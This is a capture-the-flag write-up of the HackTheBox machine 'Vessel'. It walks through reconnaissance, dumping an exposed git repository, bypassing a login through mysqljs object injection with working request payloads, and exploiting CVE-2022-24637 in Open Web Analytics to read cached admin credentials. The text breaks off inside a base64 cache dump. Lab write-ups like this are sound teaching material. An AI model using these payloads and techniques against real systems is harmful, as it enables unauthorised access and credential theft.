---
title: HTB: Vessel
url: https://0xdf.gitlab.io/2023/03/25/htb-vessel.html
date: 2023-03-25T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-vessel, hackthebox, nmap, ffuf, nodejs, express, feroxbuster, git, gitdumper, express-escape-functions, escape-functions, mysqljs, mysqljs-escape-functions, cve-2022-24637, source-code, github, mass-assignment, log-poisoning, webshell, php, python, pyinstaller, pyinstxtractor, uncompyle6, python-pyside2, python-qt, pdfcrack, cve-2022-0811, virus-total, pinns, crio, kernel-parameters, crashdump, youtube, htb-updown
---

![Vessel-cover](https://0xdfimages.gitlab.io/img/vessel-cover.png)

Vessel is a really clever box with some nice design. Several of the bugs are publicly disclosed, but at the time of release didn’t have public exploit, so they required digging into the tech to figure out how to abuse them. I’ll start by pulling a git repo from the website, and find an unsafe call to MySQL from Express. This bug is surprising, as the code looks good, and I’ll dig into it more in Beyond Root. After abusing the type confusion to get SQL injection and a hash, I’ll log in and find a link to a new subdomain hosting an instance of Open Web Analytics. I’ll abuse an information discloser vulnerability to get admin access to OWA, and then a mass assignment vuln to move a log into a web-accessible directory and poison that log to get execution and a shell. I’ll reverse a PyInstaller-generated exe to recover a password to pivot to the next user. From there, I’ll abuse a SetUID binary that’s part of CRI-O to change kernel parameters and get a shell as root.

## Box Info

| Name | [Vessel](https://hackthebox.com/machines/vessel)  [Vessel](https://hackthebox.com/machines/vessel) [Play on HackTheBox](https://hackthebox.com/machines/vessel) |
| --- | --- |
| Release Date | [27 Aug 2022](https://twitter.com/hackthebox_eu/status/1562801992518766593) |
| Retire Date | 25 Mar 2023 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Vessel |
| Radar Graph | Radar chart for Vessel |
| First Blood User | 03:23:16[Coaran Coaran](https://app.hackthebox.com/users/183082) |
| First Blood Root | 04:20:10[irogir irogir](https://app.hackthebox.com/users/476556) |
| Creator | [0xM4hm0ud 0xM4hm0ud](https://app.hackthebox.com/users/480031) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.178
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-14 17:22 EDT
Nmap scan report for 10.10.11.178
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.178
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-14 17:23 EDT
Nmap scan report for 10.10.11.178
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vessel
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.90 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

### Subdomain Fuzz

While I haven’t seen it yet, there’s a domain, `vessel.htb` on the webpage. Given the use of domain names, I’ll check for any subdomains that respond differently than the default page with `ffuf`:

```

oxdf@hacky$ ffuf -u http://10.10.11.178 -H "Host: FUZZ.vessel.htb" -mc all -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 15030

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/                                                                  

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.178
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.vessel.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 15030
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 418 req/sec :: Duration: [0:00:14] :: Errors: 0 ::

```

Nothing here.

### vessel.htb - TCP 80

#### Site

The website is some kind of consulting company:

[![image-20230314172650683](https://0xdfimages.gitlab.io/img/image-20230314172650683.png)](https://0xdfimages.gitlab.io/img/image-20230314172650683.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230314172650683.png)

There is a contact form at the bottom. If I fill it out and submit, it says submission successful:

![image-20230314172821161](https://0xdfimages.gitlab.io/img/image-20230314172821161.png)

But looking in Burp Proxy, no request is sent, so it’s likely just a dummy form.

Just below that, it does list the domain name `vessel.htb`:

![image-20230314174852213](https://0xdfimages.gitlab.io/img/image-20230314174852213.png)

There is a link to login in the nav bar, which leads to `/login`:

![image-20230314172925544](https://0xdfimages.gitlab.io/img/image-20230314172925544.png)

There’s a link for “Forgot Password?” that leads to `/reset`:

![image-20230314173105060](https://0xdfimages.gitlab.io/img/image-20230314173105060.png)

And “Need an account? Sign up!”, which leads to `/register`:

![image-20230314173139289](https://0xdfimages.gitlab.io/img/image-20230314173139289.png)

When I try to register, it just says it’s not available:

![image-20230314173214657](https://0xdfimages.gitlab.io/img/image-20230314173214657.png)

#### Tech Stack

The HTTP headers show that it is running the NodeJS framework [ExpressJS](https://expressjs.com/):

```

HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 21:24:41 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"3ab6-fxJsnDvEyrs1BpGR1cM7Ovl8AME-gzip"
Vary: Accept-Encoding
Content-Length: 15030
Connection: close

```

There’s no `index.html` file, and the paths seem to be extensionless, which makes sense for Express.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.178

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.8.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.178
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.8.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD        -         -         -         - http://10.10.11.178 => auto-filtering 404-like response (26 bytes); toggle this behavior by using --dont-filter
301      GET       10l       16w      173c http://10.10.11.178/css => http://10.10.11.178/css/
200      GET      243l      871w    15030c http://10.10.11.178/
302      GET        1l        4w       28c http://10.10.11.178/admin => http://10.10.11.178/login
302      GET        1l        4w       28c http://10.10.11.178/Admin => http://10.10.11.178/login
301      GET       10l       16w      173c http://10.10.11.178/dev => http://10.10.11.178/dev/
200      GET       70l      182w     4213c http://10.10.11.178/Login
200      GET       51l      125w     2393c http://10.10.11.178/404
302      GET        1l        4w       28c http://10.10.11.178/ADMIN => http://10.10.11.178/login
200      GET       51l      117w     2335c http://10.10.11.178/500
200      GET       89l      234w     5830c http://10.10.11.178/Register
302      GET        1l        4w       28c http://10.10.11.178/Logout => http://10.10.11.178/login
403      GET        9l       28w      277c http://10.10.11.178/server-status
200      GET       63l      177w     3637c http://10.10.11.178/reset
200      GET       52l      120w     2400c http://10.10.11.178/401
200      GET       70l      182w     4213c http://10.10.11.178/LOGIN
200      GET       63l      177w     3637c http://10.10.11.178/Reset
[####################] - 1m     90000/90000   0s      found:16      errors:149    
[####################] - 1m     30004/30000   423/s   http://10.10.11.178/ 
[####################] - 1m     30004/30000   428/s   http://10.10.11.178/css/ 
[####################] - 1m     30004/30000   453/s   http://10.10.11.178/dev/ 

```

There’s a few things of interest. `/dev` returns a redirect to `/dev/` which just returns a redirect to a custom 404 page at `/404`.

`/admin` seems interesting, but it leads back to `/login`, suggesting it requires auth.

#### Identify .git

This cost me a bunch of time on initially solving the box. I’ve talked [before](/2023/01/21/htb-updown.html#identify-git-repo) about how identifying Git repos is a weakness in my methodology. Knowing this, I’ve been often brute forcing with `raft-small-words.txt` because it will check for `.git` (been considering going there as a default, which I could now set in the [Feroxbuster config file](https://youtu.be/d4tYWJzZ8QE?t=341)). But even that wouldn’t find anything on Vessel.

It turns out that `/dev/.git` returns a redirect to `/404` just like anything else on the site that doesn’t exist. But `/dev/.git/config` returns something:

```

oxdf@hacky$ curl http://vessel.htb/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Ethan
        email = ethan@vessel.htb

```

This can be found with something like `common.txt` (in [SecLists](https://github.com/danielmiessler/SecLists)), which includes not only `.git` but a few files inside the folder as well:

```

oxdf@hacky$ grep '^.git/' /opt/SecLists/Discovery/Web-Content/common.txt 
.git/HEAD
.git/config
.git/index
.git/logs/

```

`feroxbuster` with this wordlist does find the repo:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.178/ -w /opt/SecLists/Discovery/Web-Content/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.8.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.178/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.8.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD        -         -         -         - http://10.10.11.178/ => auto-filtering 404-like response (26 bytes); toggle this behavior by using --dont-filter
200      GET      243l      871w    15030c http://10.10.11.178/
...[snip]...
200      GET        1l        2w       23c http://10.10.11.178/dev/.git/HEAD
200      GET       19l       55w     3596c http://10.10.11.178/dev/.git/index
...[snip]...
200      GET        8l       20w      139c http://10.10.11.178/dev/.git/config...[snip]...

```

## Shell as www-data

### Authenticated Site Access

#### Download Repo

[git-dumper](https://github.com/arthaud/git-dumper) is a nice way to pull the repo from the website (`pipx install git-dumper`). I’ll give it the url to the directory with a `.git` repo and a directory to save in:

```

oxdf@hacky$ mkdir git
oxdf@hacky$ git-dumper http://vessel.htb/dev git             
[-] Testing http://vessel.htb/dev/.git/HEAD [200]
[-] Testing http://vessel.htb/dev/.git/ [302]
[-] Fetching common files
...[snip]...
[-] Fetching http://vessel.htb/dev/.git/objects/d0/2d9b464fe19e78d4cda32b7e19ae62200c7140 [200]
[-] Running git checkout . 

```

The last thing the script does it `git checkout` to get the latest commit. The files are there:

```

oxdf@hacky$ ls
config  index.js  public  routes  views
oxdf@hacky$ git status 
On branch master
nothing to commit, working tree clean

```

#### Repo Analysis

There’s only a couple commits in this repo:

```

oxdf@hacky$ git log --oneline 
208167e (HEAD -> master) Potential security fixes
edb18f3 Security Fixes
f1369cf Initial commit

```

From “Initial commit” to “Security Fixes”, the only thing that changes is removing an obvious SQL injection:

```

oxdf@hacky$ git diff f1369cf edb18f3
diff --git a/routes/index.js b/routes/index.js
index be2adb1..0cf479c 100644
--- a/routes/index.js
+++ b/routes/index.js
@@ -61,7 +61,7 @@ router.post('/api/login', function(req, res) {
        let username = req.body.username;
        let password = req.body.password;
        if (username && password) {
-               connection.query("SELECT * FROM accounts WHERE username = '" + username + "' AND password = '" + password + "'", function(error, results, fields) {
+               connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
                        if (error) throw error;
                        if (results.length > 0) {
                                req.session.loggedin = true;

```

The next change just adds a comment:

```

oxdf@hacky$ git diff edb18f3 208167e
diff --git a/routes/index.js b/routes/index.js
index 0cf479c..69c22be 100644
--- a/routes/index.js
+++ b/routes/index.js
@@ -1,6 +1,6 @@
 var express = require('express');
 var router = express.Router();
-var mysql = require('mysql');
+var mysql = require('mysql'); /* Upgraded deprecated mysqljs */
 var flash = require('connect-flash');
 var db = require('../config/db.js');
 var connection = mysql.createConnection(db.db)

```

It’s not clear what they mean by “Upgraded deprecated mysqljs”.

The `config/db.js` file has MySQL creds:

```

var mysql = require('mysql');

var connection = {
        db: {
        host     : 'localhost',
        user     : 'default',
        password : 'daqvACHKvRn84VdVp',
        database : 'vessel'
}};

module.exports = connection;

```

I’ll note these, though they don’t end up being needed.

#### Bypass Login

When I Google “mysqljs sql injection”, the top result is a post on Medium titled [Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4):

![image-20230320162004010](https://0xdfimages.gitlab.io/img/image-20230320162004010.png)

In fact, the vulnerable code sample in that post looks exactly like the one in the repo:

![image-20230320162147523](https://0xdfimages.gitlab.io/img/image-20230320162147523.png)

Query escape functions like above are meant to fill replace the `?` with the strings and not allow any code there such as open/close quotes or equals signs. However, Express mis-handles how different object types are passed into these function. Looking at the example above, if the data submitted is:

```

{
    "username": "admin",
    "password": {
        "password": 1,
    }
}

```

Then Express / mysqljs will take that and make the following query:

```

SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1;

```

That will simplify further to:

```

SELECT * FROM accounts WHERE username = 'admin' AND 1 = 1;
SELECT * FROM accounts WHERE username = 'admin';

```

#### Exploit on Vessel

The POST request to login looks like:

```

POST /api/login HTTP/1.1
Host: 10.10.11.178
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.11.178
Connection: close
Referer: http://10.10.11.178/login
Cookie: connect.sid=s%3AfwFGY0wm3c9GJN8d0uhaJ_NzLEHOHe1H.oWpvrp2N0NsEbGizfrOv2DZ2U1GAHz3zv%2BMdvjfq1JU
Upgrade-Insecure-Requests: 1

username=admin&password=admin

```

I’ll send that to repeater, and convert it to JSON (changing both the body and the `Content-Type` header):

```

POST /api/login HTTP/1.1
Host: 10.10.11.178
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 50
Origin: http://10.10.11.178
Connection: close
Referer: http://10.10.11.178/login
Cookie: connect.sid=s%3AfwFGY0wm3c9GJN8d0uhaJ_NzLEHOHe1H.oWpvrp2N0NsEbGizfrOv2DZ2U1GAHz3zv%2BMdvjfq1JU
Upgrade-Insecure-Requests: 1

{"username": "admin", "password": "admin"}

```

I’ll send that, and confirm it still returns a redirect to `/login`:

![image-20230320163526183](https://0xdfimages.gitlab.io/img/image-20230320163526183.png)

Now I’ll change the `"password"` value to be a nested object. Now the response is a redirect to `/admin`:

![image-20230320163448793](https://0xdfimages.gitlab.io/img/image-20230320163448793.png)

I can either grab that cookie and put it into Firefox with dev tools, or do it again from the browser and intercept the request with Burp and modify the request.

This escape function bypass also works using the `x-www-form-urlencoded` payload like this:

![image-20230320165539112](https://0xdfimages.gitlab.io/img/image-20230320165539112.png)

I’m not sure if that would always be the case, so it’s worth checking both. I’ll play with this a bit more and fix the vulnerable code in [Beyond Root](#beyond-root).

#### Enumerate Site

After bypassing the login, `/admin` returns a dashboard:

[![image-20230320165803961](https://0xdfimages.gitlab.io/img/image-20230320165803961.png)](https://0xdfimages.gitlab.io/img/image-20230320165803961.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230320165803961.png)

There’s not much of interest on this page. There’s a drop down menu at the top right:

![image-20230321052807483](https://0xdfimages.gitlab.io/img/image-20230321052807483.png)

“Settings” and “Activity Log” don’t go anywhere, but “Analytics” leads to `http://openwebanalytics.vessel.htb/`. I’ll add that to my `/etc/hosts` file.

### openwebanalytics.vessel.htb

#### Site

The site presents a login form for an [Open Web Analytics](https://www.openwebanalytics.com/) instance:

![image-20230321054921465](https://0xdfimages.gitlab.io/img/image-20230321054921465.png)

Open Web Analytics is:

> the free and open source web analytics framework that lets you stay in control of how you instrument and analyze the use of your websites and application.

It’s a free and open-source alternative to products like Google Analytics.

The “Forgot your password?” link leads to another form:

![image-20230321055015381](https://0xdfimages.gitlab.io/img/image-20230321055015381.png)

If I try “0xdf@vessel.htb”, it returns an error showing that that user doesn’t exist:

![image-20230321055049297](https://0xdfimages.gitlab.io/img/image-20230321055049297.png)

On the other hand, if I try “admin@vessel.htb”, it reports success, which means I can enumerate valid users via this process:

![image-20230321055122255](https://0xdfimages.gitlab.io/img/image-20230321055122255.png)

#### Tech Stack

Visiting `/` redirects to `http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm&owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&`. This URL shows a few things:
- The site is running on PHP;
- `index.php` seem to handle everything, with the `owa_do` parameter seeming to indicate what to present;
- `owa_go` seems like the next URL to go to on successful login.

The HTML source reveals the version of OWA as 1.7.3:

![image-20230321055656139](https://0xdfimages.gitlab.io/img/image-20230321055656139.png)

#### Identify Vulnerability

The GitHub [repo for OWA](https://github.com/Open-Web-Analytics/Open-Web-Analytics) shows that the current version as of Jan 7 2023 is 1.7.8:

![image-20230321055755548](https://0xdfimages.gitlab.io/img/image-20230321055755548.png)
1.7.3 was released on Nov 10, 2021, and the next version, 1.7.4 was released on Feb 2, 2022. Given that Vessel was submitted to HackTheBox in May 2022, it seems like the older version was used (potentially intentionally?).

The release notes for 1.7.4 include a “CRITICAL SECURITY FIX”:

![image-20230321060024789](https://0xdfimages.gitlab.io/img/image-20230321060024789.png)

### Admin Access to OWA

#### CVE-2022-24637 Background

This exploit is really nicely described in [this post](https://devel0pment.de/?p=2494) from devel0pment.de. The issue is in cached files that are generated by the site. The files are meant to be PHP files. The code that generates the files writes `<?php\n...`. The problem is that in that code, the string is held in single quotes, and in single quotes, PHP [displays the string “as is”](https://stackoverflow.com/questions/3446216/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/3446286#3446286). That means the resulting file looks like:

```

<?php\n [more stuff]

```

That breaks the `<?php` tag, and thus the interpreter handles the file as text and not PHP. This is defined in the source of `modules/base/classes/fileCache.php` at [line 37](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L37):

![image-20230321061736422](https://0xdfimages.gitlab.io/img/image-20230321061736422.png)

These cache files are publicly accessible without auth in `owa-data/caches/`. A cached `User` object is stored in `owa-data/caches/[user id]/owa_user/[hash].php`. A simple failed login is enough to get data to exist.

There are a few POC exploits for this vulnerability on ExploitDB and GitHub. These were published well after the release of Vessel, so I’m going to proceed without them to show the experience of solving at release time.

#### Collect Data

To exploit this, I’ll need a user. I’ve already validated above that `admin@vessel.htb` exists. I’m going to assume that user’s username is admin and try to target that. After a failed login as admin, I’ll check `owa-data/caches`, and there is a `1` folder (which makes sense that the admin user id would be 1):

![image-20230321084651545](https://0xdfimages.gitlab.io/img/image-20230321084651545.png)

Inside that directory, there’s are different types of cache data folders:

![image-20230321084721613](https://0xdfimages.gitlab.io/img/image-20230321084721613.png)

According to the post, the one to target is `owa_user`. Visiting this directory shows it empty:

![image-20230321084907597](https://0xdfimages.gitlab.io/img/image-20230321084907597.png)

However, immediately after a failed login, it returns an empty page. The cache seems to clear this directory periodically.

Presumably the file I need to read is in that dir, but I need to know the name.

#### Get File Name

This is the trickiest part of the exploit. The post says:

> Since the PHP cache files are publicly accessible (**owa-data/caches/**), we can retrieve the base64 encoded serialized data. In order to do this, we need to know the name of the cache file. Though it turned out, that the filename is predictable. If the admin user at least logged in once, the cache file exists. But even if the user never logged in, we can trigger the creation by trying to login with this user. The failed login attempt does also create the cache file.
>
> After calculating the filename, we can easily retrieve the cache file:

The filename is predictable, and we can calculate it, but it doesn’t go into how. I’ll download the [vulnerable code](https://github.com/Open-Web-Analytics/Open-Web-Analytics/releases/tag/1.7.3), and start where the blog post identified as the vulnerable function, `putItemToCacheStore` in `fileCache.php` (source [here](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L88-L134)).

```

    function putItemToCacheStore($collection, $id) {

        if ( $this->acquire_lock() ) {
            $this->makeCacheCollectionDir($collection);
            $this->debug(' writing file for: '.$collection.$id);
            // create collection dir
            $collection_dir = $this->makeCollectionDirPath($collection);
            // asemble cache file name
            $cache_file = $collection_dir.$id.'.php';
...[snip]...

```

The file that is eventually written is `$cache_file`, which is `$collection_dir` appended with `$id` and then `.php`.

`$collection_dir` is the result of `makeCollectionDirPath` ([source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/fileCache.php#L141-L148)):

```

    function makeCollectionDirPath($collection) {

        if (!in_array($collection, $this->global_collections)) {
            return $this->cache_dir.$this->cache_id.'/'.$collection.'/';
        } else {
            return $this->cache_dir.$collection.'/';
        }
    }

```

I’ll look at where `$collection` is passed in, but it seems likely that `$this->cache_dir` is `owa-data/caches/`, and then `$this->cache_id` is `1`, and `$collection` is the directories like `owa_user`, `owa_site`, etc.

What remains to be discovered is what is `$id` used to call `putItemToCacheStore`. This function is called from `cache.php` in `persistCache` ([source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L133-L154)). The `fileCache` object inherits from the `cache` object, so this `persistCache` function is available to any cache object. `persistCache` is called from the `__destruct` function of the `cache` object ([source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L208-L213)).

In `persistCache`, it loops over the `dirty_objs`, for each calling `putItemToCacheStore` with the `$collection` and `$id` as key and value.

`$this->dirty_objs` is an array that’s populated in the `set` function ([source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L56-L69)):

```

    function set($collection, $key, $value, $expires = '') {
    
        $hkey = $this->hash($key);
        owa_coreAPI::debug('set key: '.$key);
        owa_coreAPI::debug('set hkey: '.$hkey);
        $this->cache[$collection][$hkey] = $value;
        $this->debug(sprintf('Added Object to Cache - Collection: %s, id: %s', $collection, $hkey));
        $this->statistics['added']++;        
        $this->dirty_objs[$collection][$hkey] = $hkey;
        $this->dirty_collections[$collection] = true; 
        $this->debug(sprintf('Added Object to Dirty List - Collection: %s, id: %s', $collection, $hkey));
        $this->statistics['dirty']++;
            
    }

```

`set` takes a `$collection`, `$key`, `$value`, and `$expires`. `$key` is passed to `hash` (which just calls `md5`, [source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/modules/base/classes/cache.php#L220-L223)), and then the result is what’s stored as what is later used at the `$id`.

`set` is called in `owa_entity.php` in the `addToCache` function ([source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/owa_entity.php#L286-L293)):

```

    function addToCache($col = 'id') {
        
        if($this->isCachable()) {
            $cache = owa_coreAPI::cacheSingleton();
            $cache->setCollectionExpirationPeriod($this->getTableName(), $this->getCacheExpirationPeriod());
            $cache->set($this->getTableName(), $col.$this->get('id'), $this, $this->getCacheExpirationPeriod());
        }
    }

```

Working backwards to what’s passed to `set`, the `$collection` will be the table name, and the `$key` will be the `$col` appended with `$this->get('id')`, which actually is reading the idea from the database. `$col` has a default value of ‘id’.

`addToCache` is called a few times:

![image-20230321103133915](https://0xdfimages.gitlab.io/img/image-20230321103133915.png)

All but one of those it’s using the default parameter of “id”. I’ll try to hash the string “id1” and check for a file on the webserver, but it doesn’t work.

The time `addToCache` is called by something else is in the `getByColumn` function ([source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/owa_entity.php#L415-L457)):

```

    function getByColumn($col, $value) {
...[snip]...
        } else {
        
            $db = owa_coreAPI::dbSingleton();
            $db->selectFrom($this->getTableName());
            $db->selectColumn('*');
            owa_coreAPI::debug("Col: $col, value: $value");    
            $db->where($col, $value);
            $properties = $db->getOneRow();
            
            if (!empty($properties)) {
                
                $this->setProperties($properties);
                $this->wasPersisted = true;
                // add to cache            
                $this->addToCache($col);
                owa_coreAPI::debug('entity loaded from db');        
            }

```

When it has to go to the DB to get values, then it adds this to the cache.

`getByColumn` shows up in a lot of places, but the top one is `owa_auth.php`:

![image-20230321103544271](https://0xdfimages.gitlab.io/img/image-20230321103544271.png)

Given that I know I am targeting something that is created even on a failed login, the third one looks the most promising. It’s in the `getUser` function ([source](https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/release-1.7.3/owa_auth.php#L417-L422)):

```

    function getUser() {

        // fetch user object from the db
        $this->u = owa_coreAPI::entityFactory('base.user');
        $this->u->getByColumn('user_id', $this->credentials['user_id']);
    }

```

It’s not hard to picture that the user attempts to log in, then the database goes to get the user object (and it happens to get cached for a short time).

If that’s the case, then the `$col` is “user\_id”. If that’s right, then the filename will be `c30da9265ba0a4704db9229f864c9eb7.php`:

```

oxdf@hacky$ echo -n "user_id1" | md5sum
c30da9265ba0a4704db9229f864c9eb7  -

```

#### Get temp\_pass

After attempting a login, the file exists:

```

oxdf@hacky$ curl http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
<?php\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJGFxOVJqemhPMXNUbzBmZm5QU21HSC5aaW5SQzNMbzlLajg3cnRsaWR0UFFFY2NIMFprd09lIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToi